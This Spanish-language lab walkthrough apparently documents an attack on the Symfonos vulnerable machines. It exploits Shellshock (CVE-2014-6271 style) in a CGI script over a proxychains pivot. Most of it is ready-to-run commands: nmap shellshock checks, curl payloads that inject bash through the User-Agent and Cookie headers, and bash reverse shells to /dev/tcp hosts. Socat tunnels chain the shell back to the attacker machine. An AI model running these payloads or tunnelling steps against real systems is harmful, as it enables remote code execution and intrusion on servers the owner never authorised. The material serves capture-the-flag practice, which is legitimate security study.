| CVE-XXXX-XXXXX | Nombre de la vulnerabilidad | Tipo | Nivel | Link                                                                                                                           |
| -------------- | --------------------------- | ---- | ----- | ------------------------------------------------------------------------------------------------------------------------------ |
| CVE-2012-1823  | CGI - RCE                   | web  | 9     | [CGI](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi#old-php--cgi-rce-cve-2012-1823-cve-2012-2311) |
| CVE-2012-2311  | CGI - RCE                   | web  | 8     | [CGI](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi#old-php--cgi-rce-cve-2012-1823-cve-2012-2311) |
|                |                             |      |       |                                                                                                                                |

`Test`
en la web nos indican que existe un script de nmap capaz de identificar esta vulnerabilidad y decirnos si es efectivamente vulnerable así que vamos a probarlo
![[Pasted image 20240622191752.png]]

```python
	*Test*

nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi

```

ahora solo debemos modificar un poco nuestro escaneo para que funcione en nuestra maquina
```python
	*Escaneo personalizado*

sudo proxychains nmap -sT -p 80 -Pn --script=http-shellshock --script-args uri=/cgi-bin/underworld --max-retries=10 --host-timeout=30m 10.3.2.6 2>/dev/null
```

efectivamente los `scripts` de nmap nos indican que la maquina es vulnerable a esta `CVE`
![[Pasted image 20240622194303.png]]

`Test curl`
vamos a seguir realizando las pruebas para identificar cual de las vulnerabilidades se están efectuando. para esto en la web nos indican unos comandos que podemos usar para determinar esto

![[Pasted image 20240622194632.png]]

```python
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```

`Identificando`
en este caso el primer comando no nos ha funcionado así que parece que no es vulnerable a `RCE` sin embargo probamos el segundo comando el cual nos ha dado resultado después de 5 segundos. ya que hemos definido un **sleep 5** esto nos indica que la vulnerabilidad que esta aconteciendo aquí es una `Blind`

```python

# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)

curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi

```

ahora lo que podemos hacer es probar si tenemos ejecución de comandos en esta parte de la petición
![[Pasted image 20240622195528.png]]

desde nuestra maquina lanzamos el comando haciendo un `curl` hacia la dirección IP de la `Symfonos-2` que tiene conexión con la `symfonos-3` en este caso es la `IP: 10.3.2.7:90` y apuntamos al puerto que tendremos a la escucha en el servidor de python en la maquina `Symfonos-2`
![[Pasted image 20240622200426.png]]

`Maquina Symfonos-2`
con un servidor en la maquina `symfonos-2` podemos verificar que al hacer la petición obtenemos un `200 ok` 
![[Pasted image 20240622200445.png]]

### Reverse shell tunneling
ahora debemos solo debemos enviarnos una shell a nuestra maquina de atacante. para poder realizar esto vamos a montar un túnel con socat en la maquina `Symfonos-1` 

`Paso-1`
```python
crear un tunel con socat por el cual nuestra peticion viajara desde la maquina Symfonos-1 hacia la maquina Attack

./socat TCP-LISTEN:3232,fork TCP:10.0.2.4:6060

```

![[Pasted image 20240622204717.png]]

`Paso-2 - Maquina Symfonos 2`
```python
crear un tunel con socat por el cual nuestra peticion viajara desde la maquina Symfonos-2 hacia la Symfonos-1

./socat TCP-LISTEN:3464,fork TCP:10.3.2.6:3232
```

![[Pasted image 20240622204749.png]]

`Paso-3 Maquina Attack`

```python
crear un servidor en python para estar a la escucha, este servidor debe estar en el mismo puerto que estamos usando el socat para redirigir el trafico

python3 -m http.server 6060
```

![[Pasted image 20240622202427.png]]

`Paso-4 Symfonos-3`
ejecutamos la petición nuevamente y ahora inyectamos nuestra reverse shell
```python
sudo proxychains curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.3.2.7/3464 0>&1' http://10.3.2.6/cgi-bin/underworld/admin.cgi 2>/dev/null
```

![[Pasted image 20240622204920.png]]

`Maquina Attack`
efectivamente. la conexion 
![[Pasted image 20240622205127.png]]